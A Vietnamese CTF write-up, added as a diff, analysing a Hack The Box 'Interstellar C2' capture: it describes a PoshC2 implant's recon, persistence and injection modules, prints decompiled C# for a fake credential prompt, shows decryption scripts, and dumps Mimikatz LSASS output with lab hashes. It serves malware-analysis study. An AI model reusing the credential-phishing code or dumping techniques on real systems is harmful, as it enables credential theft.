@@ -433,3 +433,372 @@ Mình thực hiện detect nó bằng **DIE**, thì có được con này đư�
 
 Giờ mình tiếp tục phân tích qua con này bên trong dnspy:
 
+Toàn bộ các class bên trong con RAT này, sẽ bao gồm các chức năng chính của con Assembly **Core** NET 4.5, đây là module lệnh của **PoshC2** framework C2 opensource
+
+<img width="661" height="1779" alt="image" src="https://github.com/user-attachments/assets/183f9159-68e8-4a6c-a016-92f9067e2c9e" />
+
+Namespace **Core.ActiveDirectory**: bao gồm các hàm `AdSearcher()`, `GetAADJoinInformation()`, `lslnDomain()`, `LocalGroupMembrer()`, `NetSessionEnumFunc()`, `NetShareEnum()` và `ObjectTobyteArray()` với các chức năng chính của từng hàm là
+
+> `AdSearcher()`: Chức năng chính là thực hiện liệt kê qua toàn bộ các thông tin về các member user của group, userpassword nếu có trong chuỗi, lastlogontimestamp, pwdlastset, sam account của user.
+>
+> `GETAADJoinInformation()`: Chức năng chính dùng để recon qua máy đang chạy malware hiện tại đang join và Azure AD, WorkPlace, hoặc là không join vào bất kỳ môi trường nào, mục tiêu dùng để tìm ra cách khai thác đúng môi trường hiện tại của máy.
+> - Nhưng bên trong hàm `GETAADJoinInformation()`, sẽ chỉ bắt đầu lấy giá trị TypeJoin hiện tại không join môi trường nào, join AzureAD, join WorkPlace, hoặc k rõ type join
+> - Ngoài ra còn lấy UserInfo và Certificate Join của user hiện tại.
+>
+> `IsInDomain()`: Dùng để lấy status join
+>
+> `LocalGroupMember()`: Lấy giá trị toàn bộ name computer và groupName của toàn member trong LocalGroupMember -> Nhưng vẫn còn tùy thuộc vào permission của user hiện tai hoặc token api của admin để return về giá trị toàn bộ computername + groupName
+
+NameSpace **Core.Arp** bao gồm các hàm phương thức: `Arp()`, `ArpScanner()`, `IpQueryState()`, `Kernel32Imports()`, `Macstate()`, `Pv4Tools()` chức năng chính là
+> `Arp()`: Ở bước này malware thực hiện kỹ thuật Arp Scanning để recon, thu thập thông tin về MAC addr và id infra của mac đó, lấy ra giá trị về `Ip addr + Mac Addr`.
+>
+> `ArpScanner()`: thiết lập ip addr, mac addr, gọi tới các hàm đảm nhiệm các phương thức tạo nên structure của packet để thực hiện define và bắt đầu Scanner bằng các request Arp.
+>
+
+Namespace **Core.Common** bên trong chứa class `Comms` đây là class nền tảng giúp cho dropper_cs có thể giao tiếp với network bên ngoài, bởi vì bên trong dropper không có cơ chế tự network, và class `Comms` đóng vai trò là reflection dùng để gọi tới các method của dropper, đồng thời cũng là bridge để cho phép giao tiếp với C2 server
+
+Ngoài ra còn có các class khác: 
+- class **Registry**: tổng quan của class này sẽ liệt kê, đọc và nhận giá trị của reg key Unistall các giá trị UninstallString và DisplayName -> Mục đích nhận giá trị này để đọc qua toàn bộ software đã cài
+	- Cuối cùng là hàm thực hiện tạo ra một subkey để persistence `WriteHKCURegKey()`.
+
+- Class **Timer** và **Utils**: Dùng để return về realtime hiện tại, và tạo một output mảng gộp các phần output của command attacker, để POST về lại cho server
+Namespace **Core.CredPropper**: Namespace này chứa các class đóng vai trò thu thập credentials thông qua kỹ thuật phishing credentials - thông qua cách tạo một savebox, yêu cầu user nhập vào mật khẩu của mình:
+- Các phần thông tin mà malware này lấy bao gồm applicationName, username, password, domain.
+- Script logic chính tạo ra savebox để thu thập credentials là:
+
+```C#
+public static void CredPopper()
+		{
+			string text = CredentialsPrompt.usernameField;
+			Internals.CreduiInfo creduiInfo = new Internals.CreduiInfo
+			{
+				pszCaptionText = CredentialsPrompt.title,
+				pszMessageText = CredentialsPrompt.caption
+			};
+			bool flag = false;
+			string str;
+			CredentialsPrompt.PromptForCredentials(ref creduiInfo, CredentialsPrompt.title, 0, text, out str, ref flag, Internals.CredUIFlags.ShowSaveCheckBox | Internals.CredUIFlags.AlwaysShowUi | Internals.CredUIFlags.Persist | Internals.CredUIFlags.ExpectConfirmation | Internals.CredUIFlags.GenericCredentials, 2);
+			CredentialsPrompt._creds = "[+] Username: " + text + "\r\n[+] Password: " + str;
+		}
+
+		// Token: 0x060000EF RID: 239 RVA: 0x0000BE6C File Offset: 0x0000A06C
+		private static void PromptForCredentials(ref Internals.CreduiInfo creditUi, string targetName, int netError, string userName, out string password, ref bool save, Internals.CredUIFlags flags, int minLengthPassword)
+		{
+			StringBuilder stringBuilder = new StringBuilder(100);
+			stringBuilder.Append(userName);
+			StringBuilder stringBuilder2 = new StringBuilder(100);
+			creditUi.cbSize = Marshal.SizeOf(creditUi);
+			Internals.CredUIPromptForCredentialsW(ref creditUi, targetName, IntPtr.Zero, netError, stringBuilder, 100, stringBuilder2, 100, ref save, flags);
+			password = stringBuilder2.ToString();
+			while (stringBuilder2.ToString().Length < minLengthPassword)
+			{
+				Internals.CredUIPromptForCredentialsW(ref creditUi, targetName, IntPtr.Zero, netError, stringBuilder, 100, stringBuilder2, 100, ref save, flags);
+			}
+			password = stringBuilder2.ToString();
+		}
+```
+<img width="471" height="314" alt="image" src="https://github.com/user-attachments/assets/97c624ee-c799-4aa0-ab52-6b4eb350c722" />
+
+Đây là application mà attacker lợi dụng để thu thập credentials
+
+NameSpace **Core.Injection**: Các class đều thực hiện 1 mục tiêu chính là thực hiện injection shellcode vào netsh.exe - đây là một process legit của Microsoft Windows, nó cho phép attacker có thể có quyền thực hiện các thao tác với permission cao trên network, như là tạo ra connection ra bên ngoài network với tính legit cao, thực thi command từ xa, và đặc biệt là bypass qua được firewall và các trình giám sát mạng khác.
+
+Còn lại là 3 Namespace **Core.WindowsInternal**, **Core.WMI**, **Core.ProcessHandling** chủ yếu thiết lập các windows API và chuẩn bị phần hạ tầng, thực hiện các hành động khai báo, và tạo cơ sở cho các bước recon, initals access.
+
+Đi tiếp trong phần tcp.stream, mình sẽ thấy malware request GET về các packet chứa file ảnh, theo logic chứa payload ở stage2, nhưng nó hoàn toàn trống và không chứa gì, mình có đi tiếp thêm vài stream tiếp theo, thì attacker đã tiếp tục gửi xuống module thứ 2 dùng cho quá trình exploit các credentials, priviledge escalation, persistence, connect tiếp đến C2 server khác.
+
+<img width="3787" height="1349" alt="image" src="https://github.com/user-attachments/assets/4be5cd56-68b4-4911-a89d-ac5782ded00c" />
+
+Giờ mình tiếp tục thực hiện download hết payload ở stream này về bằng tshark:
+
+```
+──(nhduydeptrai㉿tobi)-[/mnt/…/CTF/HACK_THE_BOX/Challenge/Interstellar C2]
+└─$ tshark -r capture.pcapng -Y "tcp.stream eq 16" -T fields -e http.file_data | xxd -r -p > module2_stage3.bin
+```
+
+Sau đó mình dùng script tách IV và ciphertext ra rồi đem lên cyberchef decrypt:
+
+<img width="3067" height="1805" alt="image" src="https://github.com/user-attachments/assets/10d9a7ab-e492-4ecd-b4e8-f85d3961907d" />
+
+Tiếp tục detect trong `Detect it Easy`:
+
+<img width="1083" height="794" alt="image" src="https://github.com/user-attachments/assets/56d376f4-f85e-4eb5-8f31-b0417484209e" />
+
+<img width="3764" height="1833" alt="image" src="https://github.com/user-attachments/assets/9349fdbd-f11d-4517-9c92-2c583ed6148d" />
+
+Coi trên virustotal, thì nó được đặt tên là sharepoint.dll, mình research thêm về hành vi của con này thì nó thực hiện các hành động như:
+- `SharePoint.Credentials`: thực hiện các hành vi dump password từ lsass, và có 1 hàm dùng tools Mimikatz để thực hiện hành vi này, trong đây bao gồm các hàm nhỏ thực hiện các hành vi như load Pe file bằng `Command()`, Load Mimikatz Pe và thực thi command để retrive password từ LSASS bằng `LogonPassword()`, SAM dump, LSASS Secret, hàm `DCSync()` để thực thi Mimikatz PE bằng hàm `Pe.load()` dùng để retrive ntlm hash từ toàn bộ domain user. Lấy token permission của các user, cho phép thực hiện các thao tác trên các user khác, bypassUAC, thậm chí là cho phép TokenPriviledge cho class Priviledge Escalation.
+
+- `SharpSploit.Enumeration`: Chứa các class thực hiện enumeration host-based, network, domain. Sau đó lấy các info như Hostname, Username, CurrentDirectory, ip, port,...
+
+- `SharpSploit.Execution`: Namespace này chứa các class, dùng cho load các file pe, shell commands, .NET assembly - dùng để load các function throught reflection
+
+- Còn lại là các NameSpace như `SharpSploit.LateralMovement`, `SharpSploit.Persistence`, `SharpSploit.PriviledgeEscalation`.
+
+Tiếp tục dò các stream mình sẽ thấy các hành vi check status của server C2 nhiều lần của malware, sau đó thực hiện POST lên 2 stream với lượng byte lớn trong stream 20, 28. Giờ mình thực hiện download cả 2 cái, tách payload trong ảnh theo logic của stage2, bằng script:
+
+```
+from pathlib import Path
+import base64
+import zlib
+
+from Crypto.Cipher import AES
+
+KEY_B64 = "nUbFDDJadpsuGML4Jxsq58nILvjoNu76u4FIHVGIKSQ="
+
+hex_text = "".join(
+    Path("stream20_payload.bin")
+    .read_text(encoding="ascii")
+    .split()
+)
+
+# Lớp hex này là biểu diễn dữ liệu capture, không phải thuật toán mã hóa.
+container = bytes.fromhex(hex_text)
+
+# ImgGen.GetImgData() tạo cover cố định 1500 byte.
+encrypted = container[1500:]
+
+iv = encrypted[:16]
+ciphertext = encrypted[16:]
+
+
+key = base64.b64decode(KEY_B64)
+
+ciphertext = ciphertext[: len(ciphertext) - (len(ciphertext) % 16)]  
+
+print("IV:", iv.hex())
+print(f"IV length: {len(iv)} bytes")
+print(f"Ciphertext length: {len(ciphertext)} bytes")
+
+with open("final_ciphertext.bin", "wb") as f:
+    f.write(ciphertext)
+```
+
+-> Ta sẽ có 2 output 1 là output về toàn bộ output mimikatz của toàn bộ user đã bị dump credentials trong LSASS database và SAM:
+
+<details>
+	<summary>
+		Mimikatz Output
+	</summary>
+	
+```powershell
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug  8 2021 10:31:14
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(powershell) # privilege::debug
+Privilege '20' OK
+
+mimikatz(powershell) # sekurlsa::logonPasswords
+
+Authentication Id : 0 ; 1044643 (00000000:000ff0a3)
+Session           : Interactive from 1
+User Name         : IEUser
+Domain            : DESKTOP
+Logon Server      : DESKTOP
+Logon Time        : 3/7/2023 11:30:59 AM
+SID               : S-1-5-21-1281496067-1440983016-2272511217-1000
+	msv :	
+	 [00000003] Primary
+	 * Username : IEUser
+	 * Domain   : DESKTOP
+	 * NTLM     : 69943c5e63b4d2c104dbbcc15138b72b
+	 * SHA1     : e91fe173f59b063d620a934ce1a010f2b114c1f3
+	tspkg :	
+	wdigest :	
+	 * Username : IEUser
+	 * Domain   : DESKTOP
+	 * Password : (null)
+	kerberos :	
+	 * Username : IEUser
+	 * Domain   : DESKTOP
+	 * Password : (null)
+	ssp :	
+	credman :	
+	cloudap :	KO
+
+Authentication Id : 0 ; 1044605 (00000000:000ff07d)
+Session           : Interactive from 1
+User Name         : IEUser
+Domain            : DESKTOP
+Logon Server      : DESKTOP
+Logon Time        : 3/7/2023 11:30:59 AM
+SID               : S-1-5-21-1281496067-1440983016-2272511217-1000
+	msv :	
+	 [00000003] Primary
+	 * Username : IEUser
+	 * Domain   : DESKTOP
+	 * NTLM     : 69943c5e63b4d2c104dbbcc15138b72b
+	 * SHA1     : e91fe173f59b063d620a934ce1a010f2b114c1f3
+	tspkg :	
+	wdigest :	
+	 * Username : IEUser
+	 * Domain   : DESKTOP
+	 * Password : (null)
+	kerberos :	
+	 * Username : IEUser
+	 * Domain   : DESKTOP
+	 * Password : (null)
+	ssp :	
+	credman :	
+	cloudap :	KO
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 3/7/2023 11:30:00 AM
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+	cloudap :	KO
+
+Authentication Id : 0 ; 72709 (00000000:00011c05)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/7/2023 11:30:00 AM
+SID               : S-1-5-90-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	
+	credman :	
+	cloudap :	KO
+
+Authentication Id : 0 ; 72631 (00000000:00011bb7)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/7/2023 11:30:00 AM
+SID               : S-1-5-90-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	
+	credman :	
+	cloudap :	KO
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : DESKTOP$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 3/7/2023 11:30:00 AM
+SID               : S-1-5-20
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : desktop$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	
+	credman :	
+	cloudap :	KO
+
+Authentication Id : 0 ; 50926 (00000000:0000c6ee)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 3/7/2023 11:29:59 AM
+SID               : S-1-5-96-0-0
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	
+	credman :	
+	cloudap :	KO
+
+Authentication Id : 0 ; 50925 (00000000:0000c6ed)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 3/7/2023 11:29:59 AM
+SID               : S-1-5-96-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	
+	credman :	
+	cloudap :	KO
+
+Authentication Id : 0 ; 49932 (00000000:0000c30c)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 3/7/2023 11:29:59 AM
+SID               : 
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+	cloudap :	KO
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : DESKTOP$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 3/7/2023 11:29:59 AM
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : desktop$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	
+	credman :	
+	cloudap :	KO
+```
+</details>
+
+Còn lại là flag:
+
+<img width="1913" height="1764" alt="image" src="https://github.com/user-attachments/assets/7b4c0c8c-42bf-46cf-97c0-a16176401b56" />
